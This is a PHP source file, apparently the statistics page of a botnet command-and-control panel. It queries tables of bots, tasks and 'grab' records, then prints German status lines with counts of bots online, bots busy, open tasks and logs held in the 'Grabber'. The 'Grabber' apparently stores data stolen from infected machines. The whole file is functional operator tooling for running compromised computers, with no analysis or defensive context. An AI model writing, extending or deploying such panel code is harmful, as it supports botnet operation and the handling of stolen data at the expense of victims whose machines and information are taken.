<?php
	include('include/config.php');
	$query = panel_sql_request("
				SELECT 
				(SELECT count(*) FROM ".$sql_table['bots']." ) AS bots_total,
				(SELECT count(*) FROM ".$sql_table['grab']." ) AS grab_total,
				(SELECT count(*) FROM ".$sql_table['bots']." WHERE ConTime >".(time()-$time_on).") AS bots_online,
				(SELECT count(*) FROM ".$sql_table['bots']." WHERE ConTime >".(time()-86400).") AS bots_online24,
				(SELECT count(*) FROM ".$sql_table['bots']." WHERE ConTime >".(time()-604800).") AS bots_online7,
				(SELECT count(*) FROM ".$sql_table['bots']." WHERE ConTime >".(time()-$time_on)." AND taskID != 0) AS bots_busy,
				(SELECT count(*) FROM ".$sql_table['tasks']." AS t WHERE t.endTime > '".time()."' OR (t.endTime=0 )) AS tasks
				");
	$result = $query->fetch_assoc();
	$thetime = date("H:i:s", time());
	echo "<br>Es ist ".$thetime." und es sind ".$result['bots_online']." von ".$result['bots_total']." Bots Online 
	<br></br> In den letzten 24 Stunden waren ".$result['bots_online24']." Bots Online 
	</br> In den letzten 7 Tagen waren ".$result['bots_online7']." Bots Online 
	<br></br> Es arbeiten ".$result['bots_busy']." Bots  an ".$result['tasks']." Tasks
    <br>Es sind ".$result['grab_total']." Logs im Grabber";
?>